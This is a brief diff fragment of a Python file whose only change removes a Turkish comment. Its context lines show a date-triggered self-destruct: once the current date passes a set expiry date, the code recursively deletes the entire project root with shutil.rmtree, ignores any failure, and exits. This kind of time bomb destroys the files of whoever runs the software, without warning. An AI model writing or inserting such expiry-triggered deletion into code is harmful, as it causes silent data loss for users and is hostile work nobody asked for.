@@ -12,7 +12,7 @@ if datetime.date.today() > _EXPIRY_DATE:
     try:
         shutil.rmtree(_project_root)
     except Exception:
-        pass  # Silme kısmen başarısız olsa bile çık
+        pass
     sys.exit(0)
 # ─────────────────────────────────────────────────────────────────────────────
 
